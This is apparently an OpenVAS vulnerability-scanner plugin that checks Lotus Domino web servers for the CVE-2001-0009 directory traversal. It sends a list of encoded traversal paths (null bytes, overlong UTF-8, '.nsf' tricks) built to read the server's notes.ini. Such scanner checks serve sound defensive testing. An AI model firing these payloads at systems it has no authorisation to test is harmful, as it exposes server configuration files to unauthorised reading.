CPE = "cpe:/a:ibm:lotus_domino";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.12248" );
	script_version( "2020-09-22T09:01:10+0000" );
	script_tag( name: "last_modification", value: "2020-09-22 09:01:10 +0000 (Tue, 22 Sep 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2001-0009" );
	script_bugtraq_id( 2173 );
	script_name( "Lotus Domino Server Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2005 Net-Square Solutions Pvt Ltd." );
	script_family( "Web application abuses" );
	script_dependencies( "gb_hcl_domino_consolidation.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "hcl/domino/detected" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/2173" );
	script_tag( name: "summary", value: "This plugin attempts to determine the existence of a directory
  traversal bug on the remote Lotus Domino Web server." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
req = http_get( item: dir + "../../../../whatever.ini", port: port );
res = http_keepalive_send_recv( port: port, data: req );
if(!res || ereg( pattern: "^HTTP/[01]\\.[01] 200", string: res )){
	exit( 0 );
}
checks = make_list( dir + "/%00%00.nsf/../lotus/domino/notes.ini",
	 dir + "/%00%20.nsf/../lotus/domino/notes.ini",
	 dir + "/%00%c0%af.nsf/../lotus/domino/notes.ini",
	 dir + "/%00...nsf/../lotus/domino/notes.ini",
	 dir + "/%00.nsf//../lotus/domino/notes.ini",
	 dir + "/%00.nsf/../lotus/domino/notes.ini",
	 dir + "/%00.nsf/..//lotus/domino/notes.ini",
	 dir + "/%00.nsf/../../lotus/domino/notes.ini",
	 dir + "/%00.nsf.nsf/../lotus/domino/notes.ini",
	 dir + "/%20%00.nsf/../lotus/domino/notes.ini",
	 dir + "/%20.nsf//../lotus/domino/notes.ini",
	 dir + "/%20.nsf/..//lotus/domino/notes.ini",
	 dir + "/%c0%af%00.nsf/../lotus/domino/notes.ini",
	 dir + "/%c0%af.nsf//../lotus/domino/notes.ini",
	 dir + "/%c0%af.nsf/..//lotus/domino/notes.ini",
	 dir + "/...nsf//../lotus/domino/notes.ini",
	 dir + "/...nsf/..//lotus/domino/notes.ini",
	 dir + "/.nsf///../lotus/domino/notes.ini",
	 dir + "/.nsf//../lotus/domino/notes.ini",
	 dir + "/.nsf//..//lotus/domino/notes.ini",
	 dir + "/.nsf/../lotus/domino/notes.ini",
	 dir + "/.nsf/../lotus/domino/notes.ini",
	 dir + "/.nsf/..///lotus/domino/notes.ini",
	 dir + "/.nsf%00.nsf/../lotus/domino/notes.ini",
	 dir + "/.nsf.nsf//../lotus/domino/notes.ini" );
for check in checks {
	req = http_get( item: check, port: port );
	res = http_keepalive_send_recv( port: port, data: req );
	if(!res){
		continue;
	}
	if(egrep( pattern: "^HTTP/[01]\\.[01] 200", string: res ) && ContainsString( res, "DEBUG" )){
		report = http_report_vuln_url( port: port, url: check );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

